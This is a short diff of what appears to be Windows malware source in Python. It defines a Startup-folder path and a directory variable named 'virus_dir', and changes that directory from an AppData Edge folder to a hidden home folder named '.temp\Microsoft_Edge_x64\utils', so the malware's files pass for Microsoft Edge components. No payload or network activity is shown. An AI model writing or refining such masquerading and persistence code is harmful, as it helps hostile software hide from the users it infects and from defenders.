@@ -6,10 +6,10 @@ home_dir = os.path.expanduser("~")
 appdata = os.environ['APPDATA']
 shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 virus_dir = os.path.join(
-    appdata, 
-    "Microsoft", 
-    "Edge", 
-    "Temp"
+    home_dir,
+    ".temp",
+    "Microsoft_Edge_x64",
+    "utils"
 )
 
 files_to_backup = [
